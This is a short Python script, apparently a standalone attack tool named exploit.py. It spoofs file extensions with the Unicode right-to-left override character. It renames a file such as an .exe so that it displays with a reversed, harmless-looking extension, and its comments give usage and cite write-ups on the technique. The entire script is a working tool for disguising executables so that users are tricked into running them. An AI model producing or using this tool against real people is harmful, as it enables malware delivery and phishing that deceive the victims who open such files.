import os
import sys

#Coded By B3mB4m
#RTLO - RIGHT TO LEFT OVERRIDE
#http://v00d00sec.com/2015/05/05/file-extension-trick-using-rtlo-u202e/
#http://www.fileformat.info/info/unicode/char/202e/index.htm
#http://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/
#python exploit.py [MYFILE.EXE] [TURN EXTENSION] 


def exploit():
	name = sys.argv[1].split(".")[0]
	extension = sys.argv[1].split(".")[1]
	newname = os.getcwd()+os.sep+name+u"\u202E"+sys.argv[2][::-1]+"."+extension
	try:
		os.rename(sys.argv[1], newname)
		if os.path.isfile(newname):
			print "\n\nFile extension spoof complate !\n"
	except Exception as error:
		print "\nUnexpected error : %s" % error
	
exploit()
